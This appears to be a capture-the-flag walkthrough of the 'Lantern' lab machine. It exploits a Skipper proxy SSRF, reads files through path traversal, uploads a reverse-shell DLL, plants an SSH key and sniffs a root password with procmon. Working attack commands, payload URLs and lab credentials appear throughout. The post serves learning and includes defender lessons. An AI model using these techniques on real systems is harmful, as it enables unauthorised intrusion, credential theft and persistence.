Taking a quick look at the page source has a couple comments that indicate there may have been some recent changes to how this form submits. Perhaps we should try some parameter fuzzing here? If the button was of type submit, was it an x-www-form-urlencoded form before? &#x1f914;
I&rsquo;ll definitely come back to this form and try out the following:
Parameter fuzzing &#x1f6a9; File upload vulnerabilities XXE using a PDF &#x1f6a9; Vulnerability Research So far, we&rsquo;ve gained a bit of information. We know that there is some kind of Blazor-powered site running on port 3000. We also know that port 80 is using Skipper Proxy. We don&rsquo;t know what version either is using.
A little bit of searching led to two main conclusions:
Pentesting Blazor web apps is really difficult, and usually requires some kind of toolkit to interact with it. Skipper proxy has a popular SSRF for me to try. searchsploit skipper will lead you to the same result. See EDB-ID 51111 for more detail. FOOTHOLD Vacancies Form &#x1f6ab; This didn&rsquo;t lead anywhere. Feel free to skip this section if you&rsquo;re short on time.
I&rsquo;ll try filling out the form normally, and proxy it through ZAP to see how it looks. I&rsquo;ve attached a .txt format resume:
Submitting the form (POST /submit), we get a response at the bottom of the page&hellip;
Can we just change the extension?
mv resume.txt resume.pdf Submit the form again&hellip;
&#x1f602; Alright, so it&rsquo;s only checking the file extension - not MIME type or anything else (at least, as far as we know). In that case, file upload vulnerabilities might be present.
However, since we don&rsquo;t know where the uploaded file is being saved, any file upload exploit would have to be blind: probably either stored XSS or an XXE. Since it could take quite a while to investigate this (especially as an XXE), I&rsquo;ll put this aside for now and keep looking.
Skipper SSRF As mentioned earlier, there is only one entry when you check searchsploit for &ldquo;skipper&rdquo;:
When Skipper is being used as a reverse proxy, we can perform an SSRF simply by tacking on an extra header. See the ExploitDB entry for more details.
We aren&rsquo;t sure this SSRF is valid, because we don&rsquo;t actually know what version of Skipper is running. To check for the presence of this SSRF vulnerability, it would be best if we can attempt to contact another service that we already know exists&hellip; Checking for the Blazor service on port 3000 would be perfect &#x1f4a1;
After a couple attempts to get the formatting right in ZAP, I found something that worked:
Here, I&rsquo;ve simply accessed the index page of http://lantern.htb but added on the extra header:
X-Skipper-Proxy: http://127.0.0.1:3000 Upon futher testing, I see that the protocol part is being completely ignored. I can use something like this and get the same result:
X-Skipper-Proxy: nonprotocol://127.0.0.1:3000 (It doesn&rsquo;t work when no protocol is used, though)
To enumerate the ports that the target can reach, I saved the following request header into a file (ssrf.raw):
GET http://lantern.htb/ HTTP/1.1 host: lantern.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 DNT: 1 Connection: keep-alive Referer: http://lantern.htb/ Upgrade-Insecure-Requests: 1 Sec-GPC: 1 X-Skipper-Proxy: http://127.0.0.1:FUZZ content-length: 0 Next I&rsquo;ll generate a list of ports into another file (ports.lst):
seq 1 65535 &gt; ports.lst Now I&rsquo;ll enumerate using ffuf:
ffuf -w ports.lst:FUZZ -request ssrf.raw -t 10 -c -timeout 4 -mc all -fc 503 Whoa! That worked perfectly &#x1f389; We had no idea about port 5000. Let&rsquo;s send a request to it using cURL to see if it responds to HTTP:
curl http://lantern.htb/ -H &#39;X-Skipper-Proxy: http://127.0.0.1:5000&#39; &#x1f601; There&rsquo;s an internal HTTP server running there - the title is InternalLantern
InternalLantern I wanted a way to view this website through my browser. But to access this SSRF, I would need to modify my headers on every request. Not knowing any easy way to do that (besides writing my own proxy that does that), I got a browser extension that does the job perfectly - Modify Header Value for Firefox. I configured it to add just the proxy header:
Now we should be able to navigate port 5000 just by going to http://lantern.htb:
Below that, we see some data that is probably straight from a database:
The page took quite a while to load, so I checked the Network tab of my browser Dev Tools to see what was taking so long. I noticed that one of the files that took so long was dbstorage.js:
export function synchronizeFileWithIndexedDb(filename) { return new Promise((res, rej) =&gt; { const db = window.indexedDB.open(&#39;SqliteStorage&#39;, 1); db.onupgradeneeded = () =&gt; { db.result.createObjectStore(&#39;Files&#39;, { keypath: &#39;id&#39; }); }; db.onsuccess = () =&gt; { const req = db.result.transaction(&#39;Files&#39;, &#39;readonly&#39;).objectStore(&#39;Files&#39;).get(&#39;file&#39;); req.onsuccess = () =&gt; { Module.FS_createDataFile(&#39;/&#39;, filename, req.result, true, true, true); res(); }; }; let lastModifiedTime = new Date(); setInterval(() =&gt; { const path = \`/\${filename}\`; if (FS.analyzePath(path).exists) { const mtime = FS.stat(path).mtime; if (mtime.valueOf() !== lastModifiedTime.valueOf()) { lastModifiedTime = mtime; const data = FS.readFile(path); db.result.transaction(&#39;Files&#39;, &#39;readwrite&#39;).objectStore(&#39;Files&#39;).put(data, &#39;file&#39;); } } }, 1000); }); } That&rsquo;s interesting - note how it opens a window.indexedDB. This is a little bit like the browser&rsquo;s LocalStorage, but with a different data structure. After the page loaded, I noticed that I have an Indexed DB:
That means that the synchronizeFileWithIndexedDb() function ran, probably triggered by the page load. I&rsquo;ll copy the contents of this Indexed DB into a file, and trim off the starting tag, and start/end quotation marks - that way, it is completely parsable as JSON:
I&rsquo;m not sure if every Indexed DB is like this or not, but it seems that the keys in the object are all indices, and the corresponding values are all positive integers less than 256&hellip; They&rsquo;re byte values! &#x1f62e;
Indexed DB I already made sure that the data is in a format that could be read directly as JSON, so it should be pretty easy to work with. Considering the dbstorage.js code (shown in the previous section), theres a very good chance that these byte values will reconstruct whatever file was read / synced by that function.
To see if this hypothesis is true, let&rsquo;s use some python to reconstruct a file from these bytes. Here&rsquo;s the script I wrote, reconstruct_file.py:
import json import sys if len(sys.argv) &lt; 3: print(f&#39;Usage: {sys.argv[0]} &lt;input_file&gt; &lt;output_file&gt;&#39;) sys.exit(1) input_file = sys.argv[1] output_file = sys.argv[2] def write_bytes_from_json(json_file_path, output_file_path): try: # Read the JSON file and load its content into a dictionary with open(json_file_path, &#39;r&#39;) as file: byte_dict = json.load(file) # Convert the dictionary to a byte array max_index = max(int(k) for k in byte_dict.keys()) # Find the maximum index byte_array = bytearray(max_index + 1) for key, value in byte_dict.items(): byte_array[int(key)] = value # Write the byte array to the output file with open(output_file_path, &#39;wb&#39;) as file: file.write(byte_array) print(f&#34;Bytes successfully written to {output_file_path}&#34;) except FileNotFoundError: print(f&#34;File {json_file_path} not found.&#34;) except json.JSONDecodeError: print(f&#34;Error decoding JSON from {json_file_path}.&#34;) except Exception as e: print(f&#34;An unexpected error occurred: {e}&#34;) write_bytes_from_json(input_file, output_file) Now I&rsquo;ll point the script at the data and see what comes out:
python3 reconstruct_file.py loot/indexed-db.json file-contents.bin &#x1f911; The Indexed DB contents were reconstructed into an SQLite database - perfect! Let&rsquo;s take a look inside:
This is definitely the table we were just seeing at via the SSRF, at http://127.0.0.1:5000, except now we can see the extra InternalInfo column. Travis Duarte, a system administrator, had initial credentials admin : AJbFA_Q@925p9ap#22.
Before I go any further, I&rsquo;ll be sure to check for credential re-use (or in this case, a failure to change initial credentials) &#x1f91e;
The credentials work for the admin dashboard &#x1f44d;
Admin Dashboard As shown in the sidebar, the admin dashboard has several sections.
The Files tool lists out the files within the web app (for the main site running on port 80 / 8000) There&rsquo;s a Upload Content tool, but I didn&rsquo;t have any success when trying to send the file upload through ZAP or Burp - it gets transported in this strange Blazor format that I can&rsquo;t decode. Health Check might be useful, but only as an SSRF. It pretty much just loads other websites in an iframe, and reports whether or not they&rsquo;re up. The Logs feature is basically an access log for the site. It shows a much of the files that are used by Blazor for, presumably, the app running on port 3000 (the admin dashboard) Files Section The Files section is pretty useful, as it allows us to see the source code for the whole web app. Here&rsquo;s the directory structure:
I&rsquo;ll &ldquo;download&rdquo; the important files by simply copy-pasting their contents into my local filesystem. The result was this directory:
Taking a look through the app.py code, I immediately see what I needed:
from flask import Flask, render_template, send_file, request, redirect, json from werkzeug.utils import secure_filename import os app=Flask(&#34;__name__&#34;) @app.route(&#39;/&#39;) def index(): if request.headers[&#39;Host&#39;] != &#34;lantern.htb&#34;: return redirect(&#34;http://lantern.htb/&#34;, code=302) return render_template(&#34;index.html&#34;) @app.route(&#39;/vacancies&#39;) def vacancies(): return render_template(&#39;vacancies.html&#39;) @app.route(&#39;/submit&#39;, methods=[&#39;POST&#39;]) def save_vacancy(): name = request.form.get(&#39;name&#39;) email = request.form.get(&#39;email&#39;) vacancy = request.form.get(&#39;vacancy&#39;, default=&#39;Middle Frontend Developer&#39;) if &#39;resume&#39; in request.files: try: file = request.files[&#39;resume&#39;] resume_name = file.filename if resume_name.endswith(&#39;.pdf&#39;) or resume_name == &#39;&#39;: filename = secure_filename(f&#34;resume-{name}-{vacancy}-latern.pdf&#34;) upload_folder = os.path.join(os.getcwd(), &#39;uploads&#39;) destination = &#39;/&#39;.join([upload_folder, filename]) file.save(destination) else: return &#34;Only PDF files allowed!&#34; except: return &#34;Something went wrong!&#34; return &#34;Thank you! We will conact you very soon!&#34; @app.route(&#39;/PrivacyAndPolicy&#39;) def sendPolicyAgreement(): lang = request.args.get(&#39;lang&#39;) file_ext = request.args.get(&#39;ext&#39;) try: return send_file(f&#39;/var/www/sites/localisation/{lang}.{file_ext}&#39;) except: return send_file(f&#39;/var/www/sites/localisation/default/policy.pdf&#39;, &#39;application/pdf&#39;) if __name__ == &#39;__main__&#39;: app.run(host=&#39;127.0.0.1&#39;, port=8000) There are route handlers for GET /, GET /vacancies, and for POST /submit, but there&rsquo;s also a new one that we haven&rsquo;t seen before: /PrivacyAndPolicy &#x1f60e;
The /PrivacyAndPolicy endpoint takes two parameters, but neither of them have any sanitization or validation applied. Since these parameters find their way into the send_file() function, that means we have an arbitrary file read available to us!
I&rsquo;ll finish taking a look around the Admin dashboard, then I&rsquo;ll see what files I can access using the arbitrary file read &#x1f6a9;
Upload Content This section seems to be intended for uploading new customer avatars, into the hardcoded directory /var/www/sites/lantern.htb/static/images. I&rsquo;ll try it out with a regular image file:
As expected, our image file is uploaded to the specified directory. We can see if from the Files section:
This also works perfectly fine with non-image files. Here, I&rsquo;ve uploaded (and am previewing) resume.pdf:
Module Selector There&rsquo;s a really odd widget that is present on all sections of the Admin dashboard:
It&rsquo;s built using an &lt;input&gt; connected to a &lt;datalist&gt;:
&lt;datalist id=&#34;browsers&#34;&gt; &lt;option value=&#34;FileUpload&#34;&gt;&lt;/option&gt; &lt;option value=&#34;FileTree&#34;&gt;&lt;/option&gt; &lt;option value=&#34;Logs&#34;&gt;&lt;/option&gt; &lt;option value=&#34;HealthCheck&#34;&gt;&lt;/option&gt; &lt;option value=&#34;Resumes&#34;&gt;&lt;/option&gt; &lt;/datalist&gt; So all it does is select an entry that&rsquo;s already on the sidebar..? &#x1f440; That seems very out-of-place.
When we empty the &lt;input&gt; and click Search, an error appears:
Very interesting. It seems to be attempting to load /opt/components/[filename].dll when we click Search &#x1f914; Maybe this can be utilized later to achieve RCE?
Arbitrary File Read System Files As a proof of concept, let&rsquo;s try accessing /etc/passwd:
curl &#39;http://lantern.htb/PrivacyAndPolicy?lang=&amp;ext=./../../../../etc/passwd&#39; I checked /proc/self/environ and /proc/cpuinfo, but there was no result. Next, I tried checking the file descriptors:
for I in $(seq 1 100 | tr &#39;\\n&#39; &#39; &#39;); do curl &#34;http://lantern.htb/PrivacyAndPolicy?lang=&amp;ext=./../../../../proc/self/fd/$I&#34;; done No result from that either. Perhaps www-data can&rsquo;t access these files? Let&rsquo;s check /etc next:
&#x1f447; Note that I&rsquo;m filtering out results of size 55220; those are the &ldquo;negative&rdquo; results, when the except branch is taken on the /PrivacyAndPolicy route and we are provided /var/www/sites/localisation/default/policy.pdf
WLIST=/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt ffuf -w $WLIST:FUZZ -u &#34;http://lantern.htb/PrivacyAndPolicy?lang=&amp;ext=./../../../..FUZZ&#34; -t 10 -c -timeout 4 -v -fs 55220 This worked exactly as I had hoped, but didn&rsquo;t actually result in any useful files. Here&rsquo;s a small sample:
Module DLLs Now that we have an arbitrary file read, we should be able to read the code for the modules that are selectable by the Choose Module widget. After all, www-data must have read access to all those files, or the web app wouldn&rsquo;t work.
mkdir -p source/opt/components for MODULE in FileUpload FileTree Logs HealthCheck Resumes; do curl &#34;http://lantern.htb/PrivacyAndPolicy?lang=&amp;ext=./../../../../opt/components/$MODULE.dll&#34; \\ -o &#34;source/opt/components/$MODULE.dll&#34;; done; The Plan We&rsquo;ve discovered some really important things on this admin dashboard:
Using the LFI / path traversal at /PrivacyAndPolicy that we found from the Files section, we have a way to arbitrarily read files Using the Upload Content section, we have a way to write files to a particular directory Using the Choose Module widget, we have a way to load and execute .dll files Taken together, that sounds like a recipe for RCE!
Trying the Upload The Problem Let&rsquo;s try something easy first: download an existing module (I&rsquo;ll use Logs.dll), upload it, then try to load it from the upload directory.
I already downloaded Logs.dll earlier, so I&rsquo;ll upload that copy:
&#x1f631; But now, if I attempt to access that DLL, the app refuses to load it:
&#x1f914; Hmm&hellip; That&rsquo;s a deal-breaker. We need to find a way to write to /opt/components for this whole idea to be feasible.
The Solution Thankfully, without too much trouble, I found a way to write to that directory &#x1f60e;
If you analyze the change event of the &ldquo;Browse&hellip;&rdquo; button on the Upload Content tool, you can see the javascript:
function() { t._blazorFilesById = {}; const n = Array.prototype.map.call(t.files, (function(e) { const n = { id: ++t._blazorInputFileNextFileId, lastModified: new Date(e.lastModified).toISOString(), name: e.name, size: e.size, contentType: e.type, readPromise: void 0, arrayBuffer: void 0, blob: e }; return t._blazorFilesById[n.id] = n, n })); e.invokeMethodAsync(&#34;NotifyChange&#34;, n) } As it turns out, the filepath derives directly (as a relative path) from the name property that is assigned in the anonymous function call.
The above code is a snippet of blazor.server.js, which controls all interaction between the client and server. But ultimately, this code runs client-side&hellip; so why not just swap it out?
Firefox has a way to apply a Script Override. Just open Dev Tools &gt; Debugger, find blazor.server.js under Sources, then right-click the file and choose Add script override:
This will prompt you to download a file. Modifications to this file will be reflected in the browser as soon as the page reloads. I&rsquo;ll exchange out the portion of the code for my desired code (which includes a path traversal on the filename):
I&rsquo;ve saved this modified copy as blazor.server.bak.js. Now, to have the cahnges in the browser, we simply copy the file contents then refresh the page:
cp blazor.server.bak.js blazor.server.js After the page is reloaded, the script should have a little purple dot next to its name, indicating the override is currently active:
With blazor.server.js overridden, we&rsquo;ve used a path traversal to effectively change the upload directory to be /opt/components instead of /var/www/sites/lantern.htb/static/images:
Note: re-uploading Logs.dll to that same directory will result in an error, but that&rsquo;s fine - it seems like the Upload Content tool isn&rsquo;t able to overwrite files.
Success of the file write can be easily verified by using the arbitrary file read from earlier.
&#x1f601; Alright - problem solved. We can now write to the directory where the app will load modules from!
Writing the Reverse Shell For this plan to work, we need to write a DLL file that we can load as a &ldquo;module&rdquo; using the Choose Module widget. It sounds easy, but there&rsquo;s a lot involved in that. There are two main challenges here:
Reverse-engineering an existing module, so that we know how to structure our code Coding a module to run a reverse shell in Blazor While these tasks can both be done on a Linux machine, it&rsquo;s will eliminate a lot of headache to do it in Windows. Thankfully, I have a Windows host available for this task.
Decompilation We can take a look at the code inside the existing DLLs (FileUpload.dll, FileTree.dll, Logs.dll, HealthCheck.dll, and Resumes.dll) by using a decompiler.
There are a few to choose from, but a nice reliable one is dotPeek, available from JetBeans. Unfortunately, it&rsquo;s Windows-only. I&rsquo;ll use the portable version.
Examining the DLLs, it&rsquo;s clear there are some commonalities between them. Most notably, all of them declare a Component class (from Microsoft.AspNetCore.Components) that inherits from ComponentBase. They all implement some asynchronous Task runners for their function calls.
I&rsquo;ve since learned that it&rsquo;s a bit of a strange way to do things, but these DLLs have all of the frontend code inside the Component class itself, instead of definining a cshtml file to accompany the class.
I&rsquo;m not sure why they&rsquo;re structured that way, but since I&rsquo;m not very knowledgable about Blazor, I&rsquo;ll follow suit.
Making the Component Having examined the other &ldquo;modules&rdquo; as examples, I&rsquo;m ready to attempt to write my own. Since it&rsquo;s all in C#, it would be most convenient to use Visual Studio. I don&rsquo;t have the money for that, so I&rsquo;ll just use VSCode &#x1f609;
Aside: Setting up VSCode Setting up a new coding environment can be troublesome, so I&rsquo;ll do my best to make this clear and brief. First, obtain VSCode. On Windows, it&rsquo;s easiest to just download their installer.
With VSCode installed, open the Extensions tab and install the following:
Click the Settings cog of the C# extension and scroll down to the Omnisharp settings. Set the target version as 6.0.x:
[Image of setting the .NET extension target version]
Now make a new directory for the project, enter the directory, and check that the version was set properly:
dotnet --version That&rsquo;s pretty much it! Setting up the coding environment is pretty easy in VSCode, with all this extension stuff.
If you haven&rsquo;t done so already, make a project directory and enter it. We&rsquo;ll need to initialize the project, but which template to use?
dotnet new --list Since Blazor uses Razor components, the DLLs we&rsquo;ve been seeing on the target are actually Razor Class Libraries. Use that as a template:
dotnet new razorclasslib This makes a bunch of files inside the directory. Find the .cs file and rename it to whatever your &ldquo;module&rdquo; should be called. We&rsquo;ll start by importing some libs, and using an empty class in the style that we inferred by looking at the existing DLLs:
using Microsoft.AspNetCore.Components; using Microsoft.AspNetCore.Components.Rendering; namespace MyHealthCheck { public class Component : ComponentBase { // This replaces the need for a cshtml file protected override void BuildRenderTree( #nullable disable RenderTreeBuilder __builder) { __builder.OpenElement(0, &#34;div&#34;); //__builder.AddMarkupContent(12, &#34;&lt;label for=\\&#34;port\\&#34;&gt;Port:&lt;/label&gt;&#34;); __builder.CloseElement(); } } } I left a commented line in there to show how to add HTML directly &#x261d;&#xfe0f;
The &ldquo;modules&rdquo; that we&rsquo;re referencing all have some kind of Task that runs when they load, but we can do this even more simply by just adding an event handler - This ends up acting as HTML + JS. Here&rsquo;s an example:
protected override void BuildRenderTree( #nullable disable RenderTreeBuilder __builder) { // ... __builder.OpenElement(19, &#34;button&#34;); __builder.AddAttribute(20, &#34;onclick&#34;, EventCallback.Factory.Create(this, () =&gt; HandleClick(arg))); __builder.AddContent(21, &#34;CONNECT&#34;); __builder.CloseElement(); // button } private void HandleClick(string arg) { // Do stuff } And that&rsquo;s pretty much all you need - write the whole component to pop a reverse shell.
After much trial and error, I ended up finally achieving a reverse shell using a TcpClient C# style reverse shell. You can obtain a template from revshells.com. Add it into an event handler and you&rsquo;re pretty much done.
Build the code by clicking the Run button in the top-right of the window:
VSCode will complain that your project is a library and doesn&rsquo;t run; don&rsquo;t worry, your built DLL will be sitting inside the bin/Debug/net6.0 subdirectory. Keep the DLL handy - we&rsquo;ll need to upload it to the target.
RCE At Last We finally have all the pieces in place:
A way to execute &ldquo;modules&rdquo;, as long as they&rsquo;re in /opt/components A way to upload a &ldquo;module&rdquo; into /opt/components A malicious &ldquo;module&rdquo; to form a reverse shell So, without further ado, let&rsquo;s make it happen!
Reverse shell listener Open a firewall port and start a listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash # important if you want to upgrade the shell later nc -lvnp 4444 Load the module The browser-level Script override should still be functional, so just upload the module like any other file.
In the Choose Module widget, enter the name of your DLL (without file extension) to load it. Mine was called MyHealthCheck:
Utilize your component to start the reverse shell. For me, I entered my tun0 IP address and port 4444, then clicked CONNECT:
I had to make three attempts to form the connection before it worked. Not sure why &#x1f937;&zwj;&#x2642;&#xfe0f;
&#x1f389; &#x1f389; &#x1f389; That was really difficult! I&rsquo;m so happy to finally have RCE.
USER FLAG Get the flag As a reward for all our hard work, the box has let us off the hook for the Foothold -&gt; User Flag portion - Our connection was formed as tomas, who holds the user flag in their home directory. Just cat it out for those points:
cat /home/tomas/user.txt Grab SSH key Noticing that tomas has a .ssh directory, it makes sense to check if there is already a private key sitting there.
While there are more sophisticated ways to do this, if you&rsquo;re just working from a &ldquo;dumb&rdquo; reverse shell with no line wrap, it&rsquo;s easiest to just copy-paste. Use cat /home/tomas/.ssh/id_rsa and copy the output to the clipboard.
Note: you could also plant your own SSH key, but there are two downsides
If the box resets, your planted key is gone and you&rsquo;ll have to re-exploit to plant another It&rsquo;s less stealthy. Activity on someone&rsquo;s authorized_keys file should definitely set off some alarms! Regardless, the first time I entered the box, I didn&rsquo;t notice the private key so I planted my own. This was the method, in case you are unfamiliar:
On the attacker host, generate a key pair and set permissions:
ssh-keygen -t rsa -b 4096 -f ./id_rsa -N &#39;blueJ@Y&#39; chmod 600 ./id_rsa base64 -w 0 id_rsa.pub # Copy output to clipboard On the target host as tomas, plant the public key:
echo &#39;c3NoLXJz...mE1djK&#39; | base64 -d &gt;&gt; /home/tomas/.ssh/authorized_keys Connect to the target with SSH:
ssh -i ./id_rsa tomas@$RADDR # Use passphrase &#39;blueJ@Y&#39; Next, from the attacker machine, set permissions on the exfiltrated private key, and use it to connect:
vim ./id_rsa # Paste the private key into this file chmod 600 ./id_rsa ssh -i ./id_rsa tomas@$RADDR Oh interesting - tomas has some mail!
ROOT FLAG Local enumeration - tomas As shown above, the SSH connection greeted us with a notification that we have mail. We can see the message by reading /var/mail/tomas:
Hi Tomas,
Congratulations on joining the Lantern team as a Linux Engineer! We&rsquo;re thrilled to have you on board.
While we&rsquo;re setting up your new account, feel free to use the access and toolset of our previous team member. Soon, you&rsquo;ll have all the access you need.
Our admin is currently automating processes on the server. Before global testing, could you check out his work in /root/automation.sh? Your insights will be valuable.
Exciting times ahead!
Best.
This is a bit odd, because we can&rsquo;t actually access /root/automation.sh:
Checking sudo -l though, it seems we have access to one thing:
User tomas may run the following commands on lantern: (ALL : ALL) NOPASSWD: /usr/bin/procmon Procmon I&rsquo;ve never heard of procmon, so I checked the help text:
It seems to be a process monitor. Kind of a worse version of htop:
This program isn&rsquo;t present on my attacker host, and it isn&rsquo;t even in my package manager&rsquo;s repos, so did a little searching online to see what it&rsquo;s about.
Pretty quickly, I found a repo on Github that looks like a perfect match.
Here&rsquo;s a sample of the info we can get from each process using procmon:
Basically, we have access to all information that we could otherwise obtain using strace.
As shown in the procmon screenshot, there&rsquo;s also an Export feature. It dumps everything into a file in the working directory:
# move the file to give it an easier name mv procmon_2024-08-21_08\\:05\\:42.db procmon-dump.db The target doesn&rsquo;t have sqlite3, so let&rsquo;s exfil the file:
cd loot scp -i id_rsa tomas@$RADDR:/tmp/.Tools/procmon-dump.db . Evidence of sudo Since we can access pretty much everything that we&rsquo;d normally be able to see using strace, why not just look for evidence of somebody else using sudo? Surely there are other processes running on this box that are using an elevated shell already, right? And if so, can I catch them passing root credentials as keystrokes?
Initially, I pursued this idea by looking for evidence of someone typing in a password for a sudo command. I filtered the procmon screen for &ldquo;sudo&rdquo; and checked every write syscall.
But if you&rsquo;re pretty linux-savvy, you&rsquo;ll know that&rsquo;s not a good way to do it &#x1f609;
As a demonstration, here&rsquo;s a screenshot of me attempting sudo cat /etc/shadow without using my root password:
i.e. it might be more effective to check for calls to getuid, geteuid, setuid, seteuid, and their gid equivalents too.
Personally I&rsquo;d rather work with the database from the Export than use the procmon UI, so I opened DBeaver and made a new SQLite connection to the exfil&rsquo;d database. (Everything I&rsquo;m about to do could also be done from the sqlite3 CLI, but it&rsquo;s slightly more convenient to do it within DBeaver.)
Looking around the database, I see that the main table is ebpf. There is also a stats table that shows the 10 most common syscalls, but that doesn&rsquo;t help us. Th ebpf table has a column indicating the syscall of each process; let&rsquo;s generate our own &ldquo;stats&rdquo; table:
SELECT syscall, COUNT(*) as count FROM ebpf GROUP BY syscall ORDER BY count DESC; The fact that there&rsquo;s 1 of each of the uid/gid related syscalls got me a bit excited, but it turned out to not be important. Likewise, I found a few execve calls, but they didn&rsquo;t seem like they led anywhere in particular&hellip;
There is a lot of data in this export. I think I&rsquo;ll need to take a more targetted approach to find the privesc vector. &#x1f914;
Finding the right process It would help a lot if I could narrow down a certain syscall or a certain PID to examine. procmon seems to gather hundreds of events every second, so it&rsquo;s way too much to sift through in real time.
I&rsquo;ll run through my usual local enumeration procedure to see if I notice anything, or if it gives any ideas &#x1f50d;
I&rsquo;m kicking myself for not checking earlier, but obviously checking ps aux and ps -e would be a fantastic place to look for suspicious processes. So would pspy. A quick check to who indicates that I&rsquo;m pts/1, so who is on pts/0? Look what file they&rsquo;re modifying:
Very interesting. We already know from earlier that /root/automation.sh is of particular importance on this box, so that seems like the perfect process to check for!
Procmon again Since we know exactly which PID to examine, let&rsquo;s filter procmon for exactly that one:
sudo /usr/bin/procmon -p 6992 I&rsquo;ll let this run for a little while.
Since we&rsquo;re only watching one process, procmon isn&rsquo;t gathering events nearly as fast as earlier. I&rsquo;ll wait for a few thousand events to accumulate, then Export again and exfil the file back to my attacker host &#x1f550;
Again, I&rsquo;ll use DBeaver to analyze the results. The ebpf table makes a little more sense if I sort it by syscall then by timestamp, so that the syscalls are clustered but chronological. This is the &ldquo;filter&rdquo; to use:
syscall not null order by syscall, timestamp At least now we can see that the events are very, very repetitive. There are a lot of poll, read, and rt_sigaction events that are pretty much the same, but then there are some write calls that actually have some discernible data in the arguments. The first thing that caught my eye was the echo in them:
Almost all of the write events start with some whitespace followed by a [ and a few characters after the bracket - this is probably a control character?
If you&rsquo;ve ever accidentally messed up your tty settings, you might have seen control characters in action. They are used for all kinds of things, like moving the virtual cursor around and changing text properties.
But note that some of the events actually have a printable character preceding the control character. That&rsquo;s very interesting. Moreover, it seems like when that printable character exists, it&rsquo;s always in the same position of the text (either the 9th or 10th character).
If we really focus on the events that have a printable character, we can see that it correlates to the rows that have a resultcode equal to either 1 or 2 - Let&rsquo;s narrow down the dataset even further:
syscall like &#34;write&#34; and resultcode &gt; 0 and resultcode &lt; 3	order by syscall, timestamp &#x1f62e; Whoa - we found something! Check out the printable characters preceding the control character. They spell out sudo ./backup.sh. And the text keeps going after that, too.
Our suspicion is confirmed - We&rsquo;re looking at someone&rsquo;s keystrokes!
Let&rsquo;s refine our query a little more to try to isolate just the important characters:
select resultcode, syscall, arguments, substr(rtrim(substr(arguments,9,2), &#39;[&#39;), -1, 1) as character from ebpf where syscall like &#34;write&#34; and resultcode &gt; 0 and resultcode &lt; 3 order by timestamp ASC Unbelievable! We&rsquo;ve caught a whole shell command being run within nano. I can&rsquo;t fit it all in one screenshot, but it spells out this:
echo Q3Eddtdw3pMB | sudo ./backup.sh &#x1f911; That must be the root password, given how it&rsquo;s being used. Let&rsquo;s try it:
su # use password Q3Eddtdw3pMB &#x1f389; It worked! We have a root shell. Finish off the box by reading the root flag:
cat /root/root.txt EXTRA CREDIT Root scripts In the previous screenshot, we saw bot.exp in the /root directory. You may have also noticed earlier, that this is the process that was running nano and entering the root password:
Expect is a way of automating interaction with other applications, and uses its own scripting language. Out of interest, I took a look at this script to see how it worked:
spawn nano /root/automation.sh set text &#34;echo Q3Eddtdw3pMB | sudo ./backup.sh&#34; while {1} { foreach char [split $text &#34;&#34;] { send &#34;$char&#34; sleep 1 } send &#34;\\r&#34; sleep 0.5 for {set i 0} {$i &lt; [string length $text]} {incr i} { send &#34;\\b \\b&#34; ; } send &#34;\\r&#34; } I was also curious about the cleanup script. If you&rsquo;ve followed along with the walkthrough until now, you know that the admin dashboard kicks you out, over and over. Since Blazor is based on websockets, could they not just have established a socket session?
Actually, to do that, they would have had to use some other kind of mechanism for storing the sessions - probably something like Redis or memcached.
But if the developer did that, inevitably this would have also had to be part of the cleanup script&hellip; kind of a Catch-22!
Regardless, this was the line in the cleanup script that was responsible for all the Admin dashboard resets:
/usr/sbin/service blazor-server restart CLEANUP Target I&rsquo;ll get rid of the spot where I put my procmon dumps, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker The procmon dumps that I transferred to my attacker host were also quite large. I&rsquo;ll delete them, just to save disk space:
rm loot/procmon-dump* Also I&rsquo;ll manually get rid of my /etc/hosts entry.
It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1fab2; Keep going after finding one vulnerability in a web app. ​I have to remind myself of this all the time. My tendency is to dive into a vulnerability to try to figure out how to exploit it, rather than taking a methodical breadth-first approach. On the admin panel of Lantern, the three vulnerabilities only really became useful when you combine them all together. &#x1f511; Check for SSH keys before planting your own. It&rsquo;s a very minor mistake, but is also easily avoidable. It&rsquo;s sneakier to log in using a key that&rsquo;s already present. &#x23e9; Don&rsquo;t skip your usual enumeration procedure. Even when you think you&rsquo;ve noticed a sure-fire way to gain a foothold, or to privesc to root or anything, don&rsquo;t skip steps. On this box, I accidentally wasted a lot of time on the root privesc, because I failed to notice the nano /root/automation.sh process running as pts/0. If I would have done my usual enumeration procecedure (which involves checking the running processes), I would have noticed this much sooner. Defender &#x1f916; All services accessible over the internet should run as a service account. On Lantern, the admin dashboard was running as a human user, tomas. Creating a low-privilege account for the webserver would have been a much better idea: it affords a hacker far fewer possibilities during an attack, and mitigates the consequences of a successful attack (if one is possible).
&#x1f3e6; Maintain a barrier between client and server regarding trusted data. In two places on Lantern, we abused the trust relationship that the developer had placed in client-held data: first the filepath of the Upload Content tool on the dashboard, then again on the IndexedDB of the InternalLantern service. Think of what data should be allowed to flow between server and client, and never allow untrusted information to be accidentally trusted, or vise versa!
&#x1f510; Generate SSH keys on the remote host then use a trusted side-channel to plant the public key. This should be the first step of setting up any new host or account. If you get lazy and generate the private key on the local host (the one running sshd) then you must (at least) delete the private key afterwards. Key management can be complicated, but it&rsquo;s very important.
&#x1f64a; Beware echoed passwords. There&rsquo;s a very good reason why keystrokes on password-entry fields are not echoed (or are replaced by dots or asterisks), and this box demonstrated that reason very well. Usually, even the root user does not have direct access to someone&rsquo;s passwords - in a normal environment all they can really access is the password hash. However, when a password gets echoed, anyone spying on the terminal session, watching a remote connection, or even observing syscalls, can discern the text that&rsquo;s being entered.
